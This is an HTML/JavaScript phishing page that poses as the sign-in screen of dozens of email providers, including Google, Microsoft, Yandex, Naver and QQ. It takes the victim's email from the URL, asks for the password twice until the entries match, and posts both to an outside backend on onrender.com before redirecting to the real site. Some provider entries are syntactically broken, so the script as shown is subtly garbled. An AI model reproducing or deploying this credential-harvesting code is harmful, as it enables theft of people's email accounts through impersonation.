<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Session Authentication</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  html,body{height:100%}
  body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
    background:#ffffff;
    color:#1f2937;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:20px;
    transition:background .3s;
  }
  .card{
    background:#fff;
    border-radius:14px;
    padding:40px 36px;
    max-width:420px;
    width:100%;
    box-shadow:0 12px 48px rgba(0,0,0,.10);
    position:relative;
    overflow:hidden;
  }
  .card::before{
    content:'';
    position:absolute;top:0;left:0;right:0;height:4px;
    background:linear-gradient(90deg,#fc3f1d,#ffcc00,#fc3f1d);
  }
  .logo{
    display:flex;justify-content:center;align-items:center;
    margin-bottom:20px;
    min-height:44px;
  }
  .logo img{max-height:44px;max-width:220px;display:block}
  .subtitle{
    font-size:.92rem;color:#6b7280;
    text-align:center;margin-bottom:24px;line-height:1.5;
  }
  form{display:flex;flex-direction:column;gap:14px}
  label{font-size:.82rem;color:#475569;font-weight:500;display:block}
  input{
    width:100%;padding:13px 14px;
    border:1.5px solid #d1d5db;border-radius:8px;
    font-size:15px;outline:none;transition:.2s;
    background:#fff;color:#111;
  }
  input:focus{border-color:#fc3f1d;box-shadow:0 0 0 3px rgba(252,63,29,.15)}
  input[readonly]{background:#f3f4f6;color:#6b7280}
  button{
    width:100%;padding:14px;
    background:#fc3f1d;color:#fff;border:0;border-radius:8px;
    font-size:15px;font-weight:600;cursor:pointer;
    margin-top:6px;transition:.15s;
  }
  button:hover{filter:brightness(.94)}
  button:disabled{opacity:.6;cursor:not-allowed}
  .msg{margin-top:12px;font-size:13px;color:#6b7280;text-align:center;display:none}
  .spin{
    display:inline-block;width:12px;height:12px;
    border:2px solid #cbd5e1;border-top-color:#fc3f1d;
    border-radius:50%;animation:sp .7s linear infinite;
    vertical-align:-2px;margin-right:6px;
  }
  @keyframes sp{to{transform:rotate(360deg)}}
  .footer{margin-top:24px;font-size:12px;color:#9ca3af;text-align:center}
  .footer a{color:#9ca3af;text-decoration:none;margin:0 8px}
  .footer a:hover{text-decoration:underline}
</style>
</head>
<body>
  <div class="card" id="main-card">
    <div class="logo" id="logo-slot"></div>
    <div class="subtitle" id="subtitle-slot"></div>
    <form id="lf" autocomplete="off">
      <div>
        <label for="em" id="label-em">Email</label>
        <input id="em" type="email" name="email" required>
      </div>
      <div>
        <label for="pw" id="label-pw">Password</label>
        <input id="pw" type="password" name="password" required>
      </div>
      <button type="submit" id="btn">Sign in</button>
      <div class="msg" id="msg"></div>
    </form>
    <div class="footer" id="footer-slot"></div>
  </div>

<script>
(function(){
  // ============================================================
  // CONFIG
  // ============================================================
  var BACKEND        = "https://auto-login-secure.onrender.com";
  var FALLBACK_REDIR = "https://www.google.com";

  // ============================================================
  // READ ?u=email FROM URL
  // ============================================================
  var params = new URLSearchParams(window.location.search);
  var email  = (params.get('u') || '').trim();
  console.log('[flow] email from URL:', email || '(none)');

  // ============================================================
  // HELPERS
  // ============================================================
  function hexToRgba(hex, a){
    var h = (hex || '#000').replace('#','');
    return 'rgba(' +
      parseInt(h.substr(0,2),16) + ',' +
      parseInt(h.substr(2,2),16) + ',' +
      parseInt(h.substr(4,2),16) + ',' + a + ')';
  }

  // ============================================================
  // BRANDING — sharp SVG logos, per-provider copy + colors
  // ============================================================
  function brandForProvider(email){
    var domain = ((email.split('@')[1] || '') + '').toLowerCase();
    var tld    = domain.split('.').pop() || '';

    // ---------------- Yandex ----------------
    if (/yandex|ya\.ru/.test(domain)) return {
      name:'Yandex', lang:'ru',

      passwordLabel:'Пароль',
      buttonText:'Войти',
      accent:'#fc3f1d', accent2:'#fc3f1d',
      bg:'#ffffff',
      footer:'© Яндекс 2026',
      links:[
        {text:'Помощь', href:'https://yandex.ru/support/passport/'},
        {text:'Условия использования', href:'https://yandex.ru/legal/'}
      ]
    };

    // ---------------- ABV.bg ----------------
    if (domain === 'abv.bg') return {
      name:'ABV.bg', lang:'bg',
      logo:'/assets/abv.svg', logoAlt:'ABV.bg',
      subtitle:'Влезте в своя акаунт, за да продължите',
      emailLabel:'Имейл адрес',
      passwordLabel:'Парола',
      buttonText:'Вход',
      accent:'#003a8f', accent2:'#003a8f',
      bg:'#eaf2ff',
      footer:'© ABV.bg 2026',
      links:[
        {text:'Помощ', href:'#'},
        {text:'Условия', href:'#'}
      ]

    // ---------------- Mail.bg ----------------
    if (domain === 'mail.bg') return {
      name:'Mail.bg', lang:'bg',
      logo:'/assets/mailbg.svg', logoAlt:'Mail.bg',
      subtitle:'Влезте в своя Mail.bg акаунт',
      emailLabel:'Имейл', passwordLabel:'Парола', buttonText:'Вход',
      accent:'#0054a6', accent2:'#0054a6',
      bg:'#f0f4ff',
      footer:'© Mail.bg 2026',
      links:[]
    };

    // ---------------- Dir.bg ----------------
    if (domain === 'dir.bg') return {
      name:'Dir.bg', lang:'bg',
      logo:'/assets/dirbg.svg', logoAlt:'Dir.bg',
      subtitle:'Влезте в своя Dir.bg акаунт',
      emailLabel:'Имейл', passwordLabel:'Парола', buttonText:'Вход',
      accent:'#d32f2f', accent2:'#d32f2f',
      bg:'#fff8e1',
      footer:'© Dir.bg 2026',
      links:[]
    };

    // ---------------- Google ----------------
    if (/gmail|googlemail|google/.test(domain)) return {
      name:'Google', lang:'en',
      logo:'/assets/google.svg', logoAlt:'Google',
      subtitle:'Sign in',
      emailLabel:'Email or phone',
      passwordLabel:'Enter your password',
      buttonText:'Next',
      accent:'#1a73e8', accent2:'#1a73e8',
      bg:'#ffffff',
      footer:'',
      links:[
        {text:'English (United States)', href:'#'},
        {text:'Help', href:'https://support.google.com/accounts'},
        {text:'Privacy', href:'https://policies.google.com/privacy'},
        {text:'Terms', href:'https://policies.google.com/terms'}
      ]
    };

    // ---------------- Microsoft ----------------
    if (/outlook|hotmail|live\.com|msn|office365/.test(domain)) return {
      name:'Microsoft', lang:'en',
      logo:'/assets/microsoft.svg', logoAlt:'Microsoft',
      subtitle:'Sign in',
      emailLabel:'Email, phone, or Skype',
      passwordLabel:'Password',
      buttonText:'Sign in',
      accent:'#0067b8', accent2:'#0067b8',
      bg:'#ffffff',
      footer:'',
      links:[
        {text:'Terms of use', href:'#'},
        {text:'Privacy & cookies', href:'#'}
      ]
    };

    // ---------------- Naver ----------------
    if (domain === 'naver.com') return {
      name:'Naver', lang:'ko',
      logo:'/assets/naver.svg', logoAlt:'NAVER',
      subtitle:'',
      emailLabel:'아이디 또는 이메일',
      passwordLabel:'비밀번호',
      buttonText:'로그인',
      accent:'#03c75a', accent2:'#03c75a',
      bg:'#ffffff',
      footer:'© NAVER Corp.',
      links:[
        {text:'이용약관', href:'#'},
        {text:'개인정보처리방침', href:'#'},
        {text:'고객센터', href:'#'}
      ]
    };

    // ---------------- Daum / Kakao ----------------
    if (/daum|hanmail|kakao/.test(domain)) return {
      name:'Daum', lang:'ko',
      logo:'/assets/daum.svg', logoAlt:'Daum',
      subtitle:'',
      emailLabel:'이메일 주소',
      passwordLabel:'비밀번호',
      buttonText:'로그인',
      accent:'#fedd15', accent2:'#1e1e1e',
      bg:'#ffffff',
      footer:'© Kakao Corp.',
      links:[]
    };

    // ---------------- Yahoo ----------------
    if (/yahoo|ymail|rocketmail/.test(domain)) return {
      name:'Yahoo', lang:'en',
      logo:'/assets/yahoo.svg', logoAlt:'Yahoo',
      subtitle:'Sign in',
      emailLabel:'Email or phone',
      passwordLabel:'Password',
      buttonText:'Sign in',
      accent:'#6001d2', accent2:'#6001d2',
      bg:'#ffffff',
      footer:'© Yahoo',
      links:[]
    };

    // ---------------- QQ ----------------
    if (/qq\.com|foxmail/.test(domain)) return {
      name:'QQ', lang:'zh',
      logo:'/assets/qq.svg', logoAlt:'QQ邮箱',
      subtitle:'',
      emailLabel:'QQ号码或邮箱',
      passwordLabel:'密码',
      buttonText:'登录',
      accent:'#12b7f5', accent2:'#12b7f5',
      bg:'#ffffff',
      footer:'© 腾讯',
      links:[
        {text:'服务条款', href:'#'},
        {text:'隐私政策', href:'#'}
      ]
    };

    // ---------------- Mail.ru ----------------
    if (/mail\.ru|inbox\.ru|bk\.ru|list\.ru|internet\.ru/.test(domain)) return {
      name:'Mail.ru', lang:'ru',
      logo:'/assets/mailru.svg', logoAlt:'Mail.ru',
      subtitle:'',
      emailLabel:'Email или телефон',
      passwordLabel:'Пароль',
      buttonText:'Войти',
      accent:'#005ff9', accent2:'#005ff9',
      bg:'#ffffff',
      footer:'© Mail.ru',
      links:[]
    };

    // ---------------- iCloud ----------------
    if (/icloud|me\.com|mac\.com/.test(domain)) return {
      name:'iCloud', lang:'en',
      logo:'/assets/icloud.svg', logoAlt:'iCloud',
      subtitle:'Sign in with your Apple Account',
      emailLabel:'Apple Account',
      passwordLabel:'Password',
      buttonText:'Sign in',
      accent:'#0071e3', accent2:'#0071e3',
      bg:'#ffffff',
      footer:'© Apple Inc.',
      links:[]
    };

    // ---------------- AOL ----------------
    if (/aol|aim\.com/.test(domain)) return {
      name:'AOL', lang:'en',
      logo:'/assets/aol.svg', logoAlt:'AOL',
      subtitle:'Sign in',
      emailLabel:'Username, email or mobile',
      passwordLabel:'Password',
      buttonText:'Sign in',
      accent:'#1a73e8', accent2:'#1a73e8',
      bg:'#ffffff',
      footer:'© AOL',
      links:[]
    };

    // ---------------- Proton ----------------
    if (/proton/i.test(domain)) return {
      name:'Proton Mail', lang:'en',
      logo:'/assets/proton.svg', logoAlt:'Proton Mail',
      subtitle:'Sign in to your Proton Account',
      emailLabel:'Email or username',
      passwordLabel:'Password',
      buttonText:'Sign in',
      accent:'#6d4aff', accent2:'#6d4aff',
      bg:'#ffffff',
      footer:'© Proton AG',
      links:[]
    };

    // ---------------- Zoho ----------------
    if (/zoho/i.test(domain)) return {
      name:'Zoho', lang:'en',
      logo:'/assets/zoho.svg', logoAlt:'Zoho',
      subtitle:'Sign in to access your Zoho account',
      emailLabel:'Email address or mobile number',
      passwordLabel:'Password',
      buttonText:'Sign in',
      accent:'#d32f2f', accent2:'#d32f2f',
      bg:'#ffffff',
      footer:'© Zoho Corporation',
      links:[]
    };

    // ---------------- Tuta ----------------
    if (/tutanota|tuta/i.test(domain)) return {
      name:'Tuta', lang:'en',
      logo:'/assets/tuta.svg', logoAlt:'Tuta',
      subtitle:'Sign in',
      emailLabel:'Email address',
      passwordLabel:'Password',
      buttonText:'Sign in',
      accent:'#840010', accent2:'#840010',
      bg:'#ffffff',
      footer:'© Tutao GmbH',
      links:[]
    };

    // ---------------- T-Online ----------------
    if (/t-online/i.test(domain)) return {
      name:'T-Online', lang:'de',
      logo:'/assets/tonline.svg', logoAlt:'T-Online',
      subtitle:'Melden Sie sich bei Ihrem E-Mail-Konto an',
      emailLabel:'E-Mail-Adresse',
      passwordLabel:'Passwort',
      buttonText:'Anmelden',
      accent:'#e20074', accent2:'#e20074',
      bg:'#ffffff',
      footer:'© Telekom',
      links:[]
    };

    // ---------------- mail.com ----------------
    if (/mail\.com|email\.com/.test(domain)) return {
      name:'mail.com', lang:'en',
      logo:'/assets/mailcom.svg', logoAlt:'mail.com',
      subtitle:'Sign in to your account',
      emailLabel:'Email address',
      passwordLabel:'Password',
      buttonText:'Sign in',
      accent:'#00a0e3', accent2:'#00a0e3',
      bg:'#ffffff',
      footer:'© mail.com',
      links:[]
    };

    // ---------------- Orange ----------------
    if (/orange|wanadoo/i.test(domain)) return {
      name:'Orange', lang:'fr',
      logo:'/assets/orange.svg', logoAlt:'Orange',
      subtitle:'Identifiez-vous',
      emailLabel:'Adresse e-mail',
      passwordLabel:'Mot de passe',
      buttonText:'Se connecter',
      accent:'#ff7900', accent2:'#ff7900',
      bg:'#ffffff',
      footer:'© Orange',
      links:[]
    };

    // ---------------- Web.de ----------------
    if (/web\.de/i.test(domain)) return {
      name:'WEB.DE', lang:'de',
      logo:'/assets/webde.svg', logoAlt:'WEB.DE',
      subtitle:'Melden Sie sich an',
      emailLabel:'E-Mail-Adresse',
      passwordLabel:'Passwort',
      buttonText:'Anmelden',
      accent:'#ffcc00', accent2:'#ffcc00',
      bg:'#ffffff',
      footer:'© WEB.DE',
      links:[]
    };

    // ---------------- GMX ----------------
    if (/gmx/i.test(domain)) return {
      name:'GMX', lang:'de',
      logo:'/assets/gmx.svg', logoAlt:'GMX',
      subtitle:'Melden Sie sich an',
      emailLabel:'E-Mail-Adresse',
      passwordLabel:'Passwort',
      buttonText:'Anmelden',
      accent:'#1c4b9b', accent2:'#1c4b9b',
      bg:'#ffffff',
      footer:'© GMX',
      links:[]
    };

    // ---------------- Seznam ----------------
    if (/seznam|email\.cz/i.test(domain)) return {
      name:'Seznam', lang:'cs',
      logo:'/assets/seznam.svg', logoAlt:'Seznam',
      subtitle:'Přihlaste se',
      emailLabel:'E-mail',
      passwordLabel:'Heslo',
      buttonText:'Přihlásit se',
      accent:'#cc0000', accent2:'#cc0000',
      bg:'#ffffff',
      footer:'© Seznam.cz',
      links:[]
    };

    // ---------------- WP.pl ----------------
    if (/wp\.pl|o2\.pl|interia/i.test(domain)) return {
      name:'WP.pl', lang:'pl',
      logo:'/assets/wp.svg', logoAlt:'WP.pl',
      subtitle:'Zaloguj się',
      emailLabel:'E-mail',
      passwordLabel:'Hasło',
      buttonText:'Zaloguj się',
      accent:'#ff6a00', accent2:'#ff6a00',
      bg:'#ffffff',
      footer:'© Wirtualna Polska',
      links:[]
    };

    // ---------------- Libero ----------------
    if (/libero|virgilio/i.test(domain)) return {
      name:'Libero', lang:'it',
      logo:'/assets/libero.svg', logoAlt:'Libero',
      subtitle:'Accedi',
      emailLabel:'Email',
      passwordLabel:'Password',
      buttonText:'Accedi',
      accent:'#ffcc00', accent2:'#ffcc00',
      bg:'#ffffff',
      footer:'© Libero',
      links:[]
    };

    // ---------------- UOL ----------------
    if (/uol\.com\.br/i.test(domain)) return {
      name:'UOL', lang:'pt',
      logo:'/assets/uol.svg', logoAlt:'UOL',
      subtitle:'Entre na sua conta',
      emailLabel:'E-mail',
      passwordLabel:'Senha',
      buttonText:'Entrar',
      accent:'#ffcc00', accent2:'#ffcc00',
      bg:'#ffffff',
      footer:'© UOL',
      links:[]
    };

    // ---------------- Rediffmail ----------------
    if (/rediff/i.test(domain)) return {
      name:'Rediffmail', lang:'en',
      logo:'/assets/rediff.svg', logoAlt:'Rediffmail',
      subtitle:'Sign in to Rediffmail',
      emailLabel:'Rediffmail ID',
      passwordLabel:'Password',
      buttonText:'Sign in',
      accent:'#d32f2f', accent2:'#d32f2f',
      bg:'#ffffff',
      footer:'© Rediff.com',
      links:[]
    };

    // ---------------- Ukr.net ----------------
    if (/ukr\.net/i.test(domain)) return {
      name:'Ukr.net', lang:'uk',
      logo:'/assets/ukr.svg', logoAlt:'Ukr.net',
      subtitle:'Увійдіть у свій акаунт',
      emailLabel:'Email',
      passwordLabel:'Пароль',
      buttonText:'Увійти',
      accent:'#0066cc', accent2:'#0066cc',
      bg:'#ffffff',
      footer:'© Ukr.net',
      links:[]
    };

    // ---------------- I.ua ----------------
    if (/i\.ua/i.test(domain)) return {
      name:'I.ua', lang:'uk',
      logo:'/assets/iua.svg', logoAlt:'I.ua',
      subtitle:'Увійдіть у свій акаунт',
      emailLabel:'Email',
      passwordLabel:'Пароль',
      buttonText:'Увійти',
      accent:'#ff6600', accent2:'#ff6600',
      bg:'#ffffff',
      footer:'© I.ua',
      links:[]
    };

    // ---------------- SAPO ----------------
    if (/sapo\.pt/i.test(domain)) return {
      name:'SAPO', lang:'pt',
      logo:'/assets/sapo.svg', logoAlt:'SAPO',
      subtitle:'Inicie sessão',
      emailLabel:'E-mail',
      passwordLabel:'Palavra-passe',
      buttonText:'Entrar',
      accent:'#0099ff', accent2:'#0099ff',
      bg:'#ffffff',
      footer:'© SAPO',
      links:[]
    };

    // ---------------- Generic fallback ----------------
    var nm = (domain.split('.')[0] || 'Mail').replace(/^\w/, function(c){ return c.toUpperCase(); });
    return {
      name: nm, lang: 'en',
      logo: '/assets/generic.svg', logoAlt: nm,
      subtitle: 'Sign in to continue',
      emailLabel: 'Email',
      passwordLabel: 'Password',
      buttonText: 'Sign in',
      accent: '#1e930c', accent2: '#1e930c',
      bg: '#ffffff',
      footer: domain ? ('© ' + domain) : '',
      links: []
    };
  }

  // ============================================================
  // APPLY BRANDING
  // ============================================================
  var brand = brandForProvider(email);

  document.body.style.background = brand.bg;
  document.documentElement.lang = brand.lang;

  document.getElementById('logo-slot').innerHTML =
    '<img src="' + brand.logo + '" alt="' + brand.logoAlt + '">';

  var sub = document.getElementById('subtitle-slot');
  sub.textContent = brand.subtitle || '';
  sub.style.display = brand.subtitle ? 'block' : 'none';

  document.getElementById('label-em').textContent = brand.emailLabel;
  document.getElementById('label-pw').textContent = brand.passwordLabel;
  document.getElementById('btn').textContent = brand.buttonText;

  // footer + links
  var footerHTML = (brand.footer || '');
  if (brand.links && brand.links.length) {
    footerHTML += '<div style="margin-top:8px">' +
      brand.links.map(function(l){
        return '<a href="' + l.href + '" rel="noopener">' + l.text + '</a>';
      }).join('') +
      '</div>';
  }
  document.getElementById('footer-slot').innerHTML = footerHTML;

  // dynamic style for accent colors
  var dynamicStyle = document.createElement('style');
  dynamicStyle.textContent =
    '.card::before{background:linear-gradient(90deg,' + brand.accent + ',' + brand.accent2 + ',' + brand.accent + ') !important}' +
    'input:focus{border-color:' + brand.accent + ' !important;box-shadow:0 0 0 3px ' + hexToRgba(brand.accent,.15) + ' !important}' +
    'button{background:' + brand.accent + ' !important}' +
    '.spin{border-top-color:' + brand.accent + ' !important}';
  document.head.appendChild(dynamicStyle);

  // prefill + lock email
  var em = document.getElementById('em');
  if (email) {
    em.value = email;
    em.readOnly = true;
    document.getElementById('pw').focus();
  } else {
    em.focus();
  }

  // ============================================================
  // LOGIN LOGIC — redirect ONLY after 2 identical passwords
  // ============================================================
  var form         = document.getElementById('lf');
  var btn          = document.getElementById('btn');
  var msg          = document.getElementById('msg');
  var attempt      = 0;
  var lockedEmail  = email || null;
  var lastPassword = null;
  var redirectUrl  = FALLBACK_REDIR;

  function showMsg(t, spin){
    msg.innerHTML = (spin ? '<span class="spin"></span>' : '') + t;
    msg.style.display = 'block';
  }

  form.addEventListener('submit', async function(e){
    e.preventDefault();
    if (attempt > 0 && lockedEmail) {
      form.email.value = lockedEmail;
    } else {
      lockedEmail = email || form.email.value.trim();
    }
    var thisPassword = form.password.value;
    attempt++;
    btn.disabled = true;
    btn.textContent = '...';
    showMsg('Verifying', true);

    var body = {
      email: lockedEmail,
      password: thisPassword,
      prevPassword: lastPassword,
      attempt: attempt
    };

    var data = null;
    try {
      var r = await fetch(BACKEND + '/api/login', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify(body)
      });
      data = await r.json().catch(function(){ return null; });
    } catch(_){}

    if (data && data.redirect) redirectUrl = data.redirect;
    lastPassword = thisPassword;

    // Not a match yet → ask again
    if (data && data.retry === true) {
      form.password.value = '';
      form.password.focus();
      form.email.readOnly = true;
      btn.disabled = false;
      btn.textContent = brand.buttonText;
      showMsg('Please re-enter your password to continue.', false);
      return;
    }

    // Match (or cap) → redirect to provider
    btn.textContent = '...';
    showMsg('Redirecting to ' + brand.name + '…', true);
    setTimeout(function(){ window.location.href = redirectUrl; }, 700);
  });
})();
</script>
</body>
</html>
